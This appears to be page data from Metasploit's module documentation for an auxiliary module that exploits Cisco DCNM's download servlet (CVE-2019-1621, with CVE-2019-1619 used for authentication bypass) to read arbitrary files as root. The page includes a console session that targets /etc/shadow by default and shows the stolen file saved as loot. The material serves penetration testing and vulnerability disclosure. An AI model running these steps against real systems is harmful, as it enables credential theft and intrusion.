{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/admin/cisco/cisco_dcnm_download","result":{"data":{"moduleMetadataJson":{"id":"a58edc67-def3-5c2f-a261-43da3e668aa9","name":"Cisco Data Center Network Manager Unauthenticated File Download","fullname":"auxiliary/admin/cisco/cisco_dcnm_download","description":"DCNM exposes a servlet to download files on /fm/downloadServlet.\n        An authenticated user can abuse this servlet to download arbitrary files as root by specifying\n        the full path of the file.\n        This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should\n        work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit\n        (see References to understand why).","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/admin/cisco/cisco_dcnm_download","documentationSlug":"/modules/documentation/auxiliary/admin/cisco/cisco_dcnm_download"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Cisco Data Center Network Manager exposes a servlet to download files on /fm/downloadServlet.\nAn authenticated user can abuse this servlet to download arbitrary files as root by specifying\nthe full path of the file (aka CVE-2019-1621).</p>\n<p>This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should\nwork on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit\n(see References to understand why), on the other versions it abuses CVE-2019-1619 to bypass authentication.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Setup RHOST, pick the file to download (FILENAME, default is /etc/shadow) and enjoy!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/http/cisco_dcnm_upload_2019) &gt; use auxiliary/admin/cisco/cisco_dcnm_download\n\nmsf5 auxiliary(admin/cisco/cisco_dcnm_download) &gt; set rhost 10.75.1.40\nrhost =&gt; 10.75.1.40\nmsf5 auxiliary(admin/cisco/cisco_dcnm_download) &gt; run\n\n[+] 10.75.1.40:443 - Detected DCNM 10.4(2)\n[*] 10.75.1.40:443 - No authentication required, ready to exploit!\n[+] 10.75.1.40:443 - Got sysTime value 1567081446000\n[+] 10.75.1.40:443 - Successfully authenticated our JSESSIONID cookie\n[+] File saved in: /home/john/.msf4/loot/20190829122407_default_10.75.1.40_ciscoDCNM.http_855907.bin\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"a58edc67-def3-5c2f-a261-43da3e668aa9"}}}